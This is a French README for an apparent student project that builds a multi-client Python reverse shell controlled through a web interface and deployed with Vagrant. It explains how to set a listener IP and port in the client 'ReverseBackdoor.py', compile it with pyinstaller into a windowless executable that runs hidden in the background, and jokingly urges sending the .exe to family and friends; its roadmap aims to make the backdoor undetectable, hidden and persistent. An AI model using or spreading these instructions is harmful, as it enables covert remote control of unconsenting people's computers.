# Reverse-shell en interface Web

_Dans le cadre du projet 2020 UF infrastucture & Système d'information, nous avons réalisé un reverse shell en python avec un contrôle depuis une interface web, ainsi qu'un déploiement à l'aide de vagrant._

_Réalisé par CEBERIO Pierre **(@PierreYnov)** et USEREAU Lucas **(@Saluc00)**._

![img](https://github.com/Saluc00/UF-Infra-B2/blob/master/Doc/img1.png)

## Sommaire

- [Documentation d'installation](##-documentation-dinstallation)
  - [0. Prérequis](###0-prérequis)
  - [I. Git clone](###i-git-clone)
  - [II. Vagrant](###ii-vagrant)
- [Documentation d'utilisation](##-documentation-dutilisation)
  - [Serveur](###-serveur)
  - [Client](###-client)
- [Pour aller plus loin](##-pour-aller-plus-loin)
- [Crédits](##-crédits)

## Documentation d'installation

_Manuel d'installation étape par étape du reverse shell_

### 0. Prérequis

Le projet demande trois prérequis, avoir **vagrant**, **virtualbox** et le module python **pyinstaller** d'installé sur son PC.

Disponible [ici](https://www.vagrantup.com/downloads.html) !

### I. Git clone

Cloner le repository avec la commande: `git clone https://github.com/Saluc00/UF-Infra-B2.git`.

### II. Vagrant

Suivant le port que vous souhaitez utiliser, changez le port dans le _VagrantFile_ du côté HOST !! **Important** !!

Placez-vous dans le fichier vagrant et faites la commande: `vagrant up`.

_Attendre la fin de l'initialisation du VagrantFile.._

Une fois l'installation du _VagrantFile_ ok, faites le commande `vagrant ssh`.

Pour lancer le serveur python, il se trouve dans `UF-Infra-B2\Multi-Client-Reverse-Shell`.

La commande pour UP le serveur: `python3 Listener.py`

## Documentation d'utilisation

### Serveur

Vous devez tout d'abord ouvrir un port sur votre serveur afin d'écouter dessus et permettre aux pc infectés de s'y connecter. La manière d'ouvrir un port diffère en fonction de votre OS, vous pouvez vous référer à ces liens pour Windows, OSX et Ubuntu :

- https://fr.wikihow.com/ouvrir-des-ports

- https://guide.ubuntu-fr.org/server/firewall.html

Une fois le port que vous avez choisi est ouvert, rendez vous dans le fichier Listener.py et allez à la ligne 341 remplacer le port 9999 par le votre.

Le serveur est maintenant prêt, il suffit de lancer l'écoute et attendre que les clients se connectent :

```
python3 Listener.py
```

La commande `list` permet de lister les clients actuellement connectés, il suffit ensuite de sélectionner le pc sur lequel on veut intervenir avec la commande `select` suivi de l'index du pc.

![img](https://github.com/Saluc00/UF-Infra-B2/blob/master/Doc/img2.png)

Pour quitter le shell sur le pc où l'on est, il suffit d'écrire `quit`.

Pour quitter l'interface Web du Reverse-Shell, il suffit de taper `exit`.

La commande `help` vous donnera les informations détaillés sur chaque commande.

La commande `upload` permet d'envoyer un fichier qu'on a sur le serveur, sur le client ( la commande `download` est encore en réalisation, elle fera l'inverse).

### Client

Afin d'être fonctionnel, il est nécessaire côté client (ReverseBackdoor.py) d'adresser l'IP de votre hôte (qui vous permettra de contrôler les ordinateurs ) à la ligne 164 (listenerIP) ainsi que de donner le port sur lequel écoute votre hôte à la ligne 165 (listenerPort).

_à la ligne 164 et 165:_

```python
  listenerIP = "77.202.221.174" # Ici mettre votre IP
  listenerPort = 9999 # Ici le port que vous avez mis en host dans le fichier vagrant
```

Pour compiler le ReverseBackdoor.py, vous aurez besoin de pyinstaller :

```
pip install pyinstaller
```

Tapez ensuite :

```
pyinstaller --onefile --windowed ReverseBackdoor.py
```

afin d'avoir le fichier ReverseBackdoor.exe en un seul fichier (sans librairie) et qui n'affiche aucune console quand vous l'exécutez mais qui reste en background.

Puis envoyer le fichier .exe créé à toutes votre famille et amis !

## Pour aller plus loin

- Régler les problèmes d'encodage
- Fix la commande `download`
- Avoir l'interface Web SSH sur notre serveur ( dépendance actuel de https://app.shellngn.com/ )
- Automatisation des tâches sur tout les ordinateurs qu'on contrôle ( pas en interactif à la mano, maybe tmux ? )
- FUD la backdoorReverseShell, cacher le processus et le rendre permanent.
- To be continued ...

## Crédits

- Shell python utilisé: https://github.com/mustafadalga/Multi-Client-Reverse-Shell
- Machine virtuelle utilisé sur le serveur d'AFN: https://awayfrom.network/
- Vagrant: https://www.vagrantup.com/
- VirtualBox: https://www.virtualbox.org/
- Python: https://www.python.org/
